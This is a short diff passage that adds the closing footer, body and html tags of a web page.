+</footer>
+
+  
+</body>
+
+</html>
